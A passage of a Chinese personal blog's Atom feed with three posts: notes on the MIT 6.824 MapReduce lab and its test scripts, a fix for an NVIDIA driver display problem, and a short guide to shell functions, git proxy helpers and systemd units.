    <id>https://jingtianer.github.io/home/2022/10/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/6.824/lab1/</id>
    <published>2022-10-28T10:00:36.000Z</published>
    <updated>2022-11-07T06:44:51.763Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><ul><li>实现一个MapReduce调度器(Coordinator)</li></ul><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol><li>下载源码</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://g.csail.mit.edu/6.824-golabs-2021 6.824</span><br></pre></td></tr></table></figure><ol start="2"><li>串行运行 word-count<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./6.824</span><br><span class="line"><span class="built_in">cd</span> src/main</span><br><span class="line">go build -race -buildmode=plugin ../mrapps/wc.go</span><br><span class="line"><span class="built_in">rm</span> mr-out*</span><br><span class="line">go run -race mrsequential.go wc.so pg*.txt</span><br><span class="line">more mr-out-0</span><br></pre></td></tr></table></figure></li></ol><h2 id="我的任务"><a href="#我的任务" class="headerlink" title="我的任务"></a>我的任务</h2><p>修改<code>mr/coordinator.go</code>,<code> mr/worker.go</code>, <code>mr/rpc.go</code>，实现coordinator和worker</p><h3 id="运行方式"><a href="#运行方式" class="headerlink" title="运行方式"></a>运行方式</h3><ul><li><p>编译并运行coordinator</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go build -race -buildmode=plugin ../mrapps/wc.go </span><br><span class="line"><span class="built_in">rm</span> mr-out*</span><br><span class="line">go run -race mrcoordinator.go pg-*.txt</span><br></pre></td></tr></table></figure></li><li><p>多开几个窗口跑worker</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run -race mrworker.go wc.so</span><br></pre></td></tr></table></figure></li><li><p>测试</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash test-mr.sh</span><br></pre></td></tr></table></figure></li></ul><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="early-exit"><a href="#early-exit" class="headerlink" title="early exit"></a>early exit</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f mr-*</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;***&#x27;</span> Starting early <span class="built_in">exit</span> <span class="built_in">test</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrcoordinator ../pg*txt &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">## give the coordinator time to create the sockets.</span></span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line"></span><br><span class="line"><span class="comment">## start multiple workers.</span></span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrworker ../../mrapps/early_exit.so &amp;</span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrworker ../../mrapps/early_exit.so &amp;</span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrworker ../../mrapps/early_exit.so &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">## wait for any of the coord or workers to exit</span></span><br><span class="line"><span class="comment">## `jobs` ensures that any completed old processes from other tests</span></span><br><span class="line"><span class="comment">## are not waited upon</span></span><br><span class="line"><span class="built_in">jobs</span> &amp;&gt; /dev/null</span><br><span class="line"><span class="built_in">wait</span> -n</span><br><span class="line"><span class="comment">## 关键是这一行</span></span><br><span class="line"><span class="comment">## a process has exited. this means that the output should be finalized</span></span><br><span class="line"><span class="comment">## otherwise, either a worker or the coordinator exited early</span></span><br><span class="line"><span class="built_in">sort</span> mr-out* | grep . &gt; mr-wc-all-initial</span><br><span class="line"></span><br><span class="line"><span class="comment">## wait for remaining workers and coordinator to exit.</span></span><br><span class="line"><span class="built_in">wait</span></span><br></pre></td></tr></table></figure><ul><li>这一行的作用是当上面任何一个线程中，第一个线程结束，则停止wait继续下面的脚本</li><li>也就是说，大家要一起退出，不能因为执行完任务了，也没有新任务了，就让worker结束<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wait</span> -n</span><br><span class="line"><span class="comment">## 关键是这一行</span></span><br></pre></td></tr></table></figure><blockquote><p>一种可行的方法是当所有reduce任务结束后，直接退出，socket连接关闭，后面的worker心跳直接连接关闭的socket导致panic退出</p></blockquote></li></ul><p>但这样太不优雅</p><blockquote><p>每个worker请求task时发送自己已经完成的reduce数<br>如果coordinator收到了所有的reduce complete消息，维护一个变量reduce，此时每收到一个RequestTask消息reduce+&#x3D;该客户端的reduce数，并发送finish消息，worker收到后立刻finish<br>Coordinator的Done实现为，该reduce大于等于NReduce时，结束运行</p></blockquote><h3 id="job-count-test"><a href="#job-count-test" class="headerlink" title="job count test"></a>job count test</h3><ul><li>检查某个job运行的次数是否正确</li><li>这个检测最初没有通过，就去看了测试脚本和源码</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;***&#x27;</span> Starting job count <span class="built_in">test</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -f mr-*</span><br><span class="line"></span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrcoordinator ../pg*txt &amp;</span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrworker ../../mrapps/jobcount.so &amp;</span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrworker ../../mrapps/jobcount.so</span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrworker ../../mrapps/jobcount.so &amp;</span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrworker ../../mrapps/jobcount.so</span><br><span class="line"></span><br><span class="line">NT=`<span class="built_in">cat</span> mr-out* | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$NT</span>&quot;</span> -ne <span class="string">&quot;8&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&#x27;---&#x27;</span> map <span class="built_in">jobs</span> ran incorrect number of <span class="built_in">times</span> <span class="string">&quot;(<span class="variable">$NT</span> != 8)&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&#x27;---&#x27;</span> job count <span class="built_in">test</span>: FAIL</span><br><span class="line">  failed_any=1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&#x27;---&#x27;</span> job count <span class="built_in">test</span>: PASS</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">wait</span></span><br></pre></td></tr></table></figure><blockquote><p>简单分析可知，加载jobcount中的特殊map，reduce函数，使输出文件输出的是map的个数<br>通过cat输出mr-out<em>的所有文件，在使用awk输出mr-out</em>的第二个参数(<code>awk &#39;print $2&#39;</code>)</p></blockquote><figure class="highlight go"><figcaption><span>mrapps/crash.go</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> count <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Map</span><span class="params">(filename <span class="type">string</span>, contents <span class="type">string</span>)</span></span> []mr.KeyValue &#123;</span><br><span class="line">me := os.Getpid()</span><br><span class="line">f := fmt.Sprintf(<span class="string">&quot;mr-worker-jobcount-%d-%d&quot;</span>, me, count)</span><br><span class="line">count++</span><br><span class="line">err := ioutil.WriteFile(f, []<span class="type">byte</span>(<span class="string">&quot;x&quot;</span>), <span class="number">0666</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(time.Duration(<span class="number">2000</span>+rand.Intn(<span class="number">3000</span>)) * time.Millisecond)</span><br><span class="line"><span class="keyword">return</span> []mr.KeyValue&#123;mr.KeyValue&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;x&quot;</span>&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Reduce</span><span class="params">(key <span class="type">string</span>, values []<span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">files, err := ioutil.ReadDir(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">invocations := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> files &#123;</span><br><span class="line"><span class="comment">// println(&quot;test, f =&quot;, f.Name(), strings.HasPrefix(f.Name(), &quot;mr-worker-jobcount&quot;))</span></span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(f.Name(), <span class="string">&quot;mr-worker-jobcount&quot;</span>) &#123;</span><br><span class="line">invocations++</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> strconv.Itoa(invocations)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>分析这里的代码可知，每调用依次map，全局变量count就会++，并创建该worker的第count个文件<br>在reduce中数当前目录下前缀为mr-worker-jobcount的文件个数就是map的个数</p></blockquote><p>调试了自己的代码，map只调用了8次，reduce只调用了一次</p><blockquote><p>注意到jobcount中使用了go已经弃用的<code>ioutils</code>包，改为os，问题解决</p></blockquote><h3 id="crash-test"><a href="#crash-test" class="headerlink" title="crash test"></a>crash test</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## mimic rpc.go&#x27;s coordinatorSock()</span></span><br><span class="line">SOCKNAME=/var/tmp/824-mr-`<span class="built_in">id</span> -u`</span><br></pre></td></tr></table></figure><p>测试脚本要模仿Coordinator的Sock</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;h3 id=&quot;实验目的&quot;&gt;&lt;a href=&quot;#实验目的&quot; class=&quot;headerlink&quot; title=&quot;实验目的&quot;&gt;&lt;/a&gt;实验目的&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;实现一个MapReduce调度器(Coordinator)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;下载源码&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; git://g.csail.mit.edu/6.824-golabs-2021 6.824&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="OS" scheme="https://jingtianer.github.io/home/categories/OS/"/>
    
    
    <category term="6.824" scheme="https://jingtianer.github.io/home/tags/6-824/"/>
    
  </entry>
  
  <entry>
    <title>显卡驱动踩坑</title>
    <link href="https://jingtianer.github.io/home/2022/10/28/linux/%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8%E8%B8%A9%E5%9D%91/"/>
    <id>https://jingtianer.github.io/home/2022/10/28/linux/%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8%E8%B8%A9%E5%9D%91/</id>
    <published>2022-10-28T09:20:00.000Z</published>
    <updated>2022-11-07T06:44:51.424Z</updated>
    
    <content type="html"><![CDATA[<h2 id="nvidia显卡驱动踩坑"><a href="#nvidia显卡驱动踩坑" class="headerlink" title="nvidia显卡驱动踩坑"></a>nvidia显卡驱动踩坑</h2><ul><li>之前更新了一次linux的内核，导致内核的显卡冲突了，hdmi没有输出，<code>nvidia-smi</code>命令也没了</li><li>重装了nvidia的显卡，发现默认使用核显，动画非常卡</li><li>后来屏蔽了linux自带的驱动nouveau，hdmi终于有输出了，显卡驱动的daemon也可以使用了(<code>nvidia-smi</code>输出正常)，但是自带的显示器却不能用了</li></ul><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><ul><li><code>/etc/X11/xorg.conf</code>文件不知道什么原因出现了错误，把这个文件内容清空，就好了</li><li>重启后发现这个文件里面本身就没东西</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;nvidia显卡驱动踩坑&quot;&gt;&lt;a href=&quot;#nvidia显卡驱动踩坑&quot; class=&quot;headerlink&quot; title=&quot;nvidia显卡驱动踩坑&quot;&gt;&lt;/a&gt;nvidia显卡驱动踩坑&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;之前更新了一次linux的内核，导致内核的显卡冲</summary>
      
    
    
    
    <category term="linux" scheme="https://jingtianer.github.io/home/categories/linux/"/>
    
    
    <category term="linux" scheme="https://jingtianer.github.io/home/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>shell的使用</title>
    <link href="https://jingtianer.github.io/home/2022/10/27/linux/shell/"/>
    <id>https://jingtianer.github.io/home/2022/10/27/linux/shell/</id>
    <published>2022-10-27T10:05:00.000Z</published>
    <updated>2022-11-07T06:44:51.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shell-fuction"><a href="#shell-fuction" class="headerlink" title="shell fuction"></a>shell fuction</h2><h3 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h3><ul><li>定义1<figure class="highlight sh"><figcaption><span>xxx.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">funcName</span></span>() &#123;</span><br><span class="line">    <span class="comment"># do sth</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>定义2<figure class="highlight sh"><figcaption><span>xxx.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">f2</span></span>() &#123;</span><br><span class="line">    value=$((<span class="variable">$1</span>+<span class="variable">$2</span>+<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$1</span> <span class="string">&quot;+&quot;</span> <span class="variable">$2</span> <span class="string">&quot;=&quot;</span> <span class="variable">$value</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><figure class="highlight sh"><figcaption><span>xxx.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">funcName</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$1</span> <span class="comment"># 打印第一个参数</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$2</span> <span class="comment"># 打印第二个参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h3><ul><li>直接在脚本中调用</li></ul><figure class="highlight sh"><figcaption><span>xxx.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">funcName</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$1</span> <span class="comment"># 打印第一个参数</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$2</span> <span class="comment"># 打印第二个参数</span></span><br><span class="line">&#125;</span><br><span class="line">funcName 刘喵喵 大帅哥</span><br></pre></td></tr></table></figure><ul><li>在shell中调用</li></ul><figure class="highlight sh"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. xxx.sh <span class="comment"># import导入其中的函数</span></span><br><span class="line">funcName 刘喵喵 大帅哥</span><br></pre></td></tr></table></figure><blockquote><p>如果function写在<code>/etc/profile</code>、<code>~/.bashrc</code>下，则可以直接调用</p></blockquote><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><ul><li>有了以上方法，在bashrc中将自己常用但容易遗忘的命令写成函数，就可以方便的调用了</li><li>如果函数忘了，，那就可以去<code>~/.bashrc</code>下看看😅x1</li><li>如果忘记去哪里看了，，，那就来看看这篇文章😅x2</li><li>如果忘记这篇文章，，，那我直接😅x3</li></ul><figure class="highlight sh"><figcaption><span>~/.bashrc</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">setgitproxy</span></span>() &#123;</span><br><span class="line">    git config --global http.proxy <span class="string">&#x27;socks5h://localhost:7890&#x27;</span></span><br><span class="line">    git config --global https.proxy <span class="string">&#x27;socks5h://localhost:7890&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">unsetgitproxy</span></span>() &#123;</span><br><span class="line">    git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">    git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ubuntu中创建unit"><a href="#ubuntu中创建unit" class="headerlink" title="ubuntu中创建unit"></a>ubuntu中创建unit</h2><h3 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h3><p>systemctl 提供了一组子命令来管理单个的 unit，其命令格式为：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl [<span class="built_in">command</span>] [unit]</span><br></pre></td></tr></table></figure><h3 id="创建unit"><a href="#创建unit" class="headerlink" title="创建unit"></a>创建unit</h3><ul><li>编写<code>.service</code>文件<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/systemd/system/xxx.service</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight sh"><figcaption><span>xxx.service</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=clash daemon</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">User=root</span><br><span class="line">ExecStart=/opt/xxx/xxx -d /etc/xxx/ <span class="comment">#start时执行的命令</span></span><br><span class="line">Restart=on-failure</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><ul><li><p>重新加载systemctl daemon</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure></li><li><p>启动service</p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start xxx.service</span><br></pre></td></tr></table></figure><ul><li>设置为开机启动</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> xxx.service</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;shell-fuction&quot;&gt;&lt;a href=&quot;#shell-fuction&quot; class=&quot;headerlink&quot; title=&quot;shell fuction&quot;&gt;&lt;/a&gt;shell fuction&lt;/h2&gt;&lt;h3 id=&quot;函数定义&quot;&gt;&lt;a href=&quot;#函数定义&quot; class=&quot;headerlink&quot; title=&quot;函数定义&quot;&gt;&lt;/a&gt;函数定义&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;定义1&lt;figure class=&quot;highlight sh&quot;&gt;&lt;figcaption&gt;&lt;span&gt;xxx.sh&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;funcName&lt;/span&gt;&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# do sth&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;定义2&lt;figure class=&quot;highlight sh&quot;&gt;&lt;figcaption&gt;&lt;span&gt;xxx.sh&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;f2&lt;/span&gt;&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    value=$((&lt;span class=&quot;variable&quot;&gt;$1&lt;/span&gt;+&lt;span class=&quot;variable&quot;&gt;$2&lt;/span&gt;+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;+&amp;quot;&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$2&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;=&amp;quot;&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;传参&quot;&gt;&lt;a href=&quot;#传参&quot; class=&quot;headerlink&quot; title=&quot;传参&quot;&gt;&lt;/a&gt;传参&lt;/h3&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;figcaption&gt;&lt;span&gt;xxx.sh&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;funcName&lt;/span&gt;&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# 打印第一个参数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$2&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# 打印第二个参数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;调用&quot;&gt;&lt;a href=&quot;#调用&quot; class=&quot;headerlink&quot; title=&quot;调用&quot;&gt;&lt;/a&gt;调用&lt;/h3&gt;</summary>
    
    
    
    <category term="linux" scheme="https://jingtianer.github.io/home/categories/linux/"/>
    
    
    <category term="shell" scheme="https://jingtianer.github.io/home/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>hexo配置&amp;踩坑&amp;自定义</title>
    <link href="https://jingtianer.github.io/home/2022/10/26/misc/hexo%E9%85%8D%E7%BD%AE&amp;%E8%B8%A9%E5%9D%91&amp;%E8%87%AA%E5%AE%9A%E4%B9%89/"/>
    <id>https://jingtianer.github.io/home/2022/10/26/misc/hexo%E9%85%8D%E7%BD%AE&amp;%E8%B8%A9%E5%9D%91&amp;%E8%87%AA%E5%AE%9A%E4%B9%89/</id>
    <published>2022-10-26T03:28:00.000Z</published>
    <updated>2022-11-19T08:23:54.623Z</updated>
    
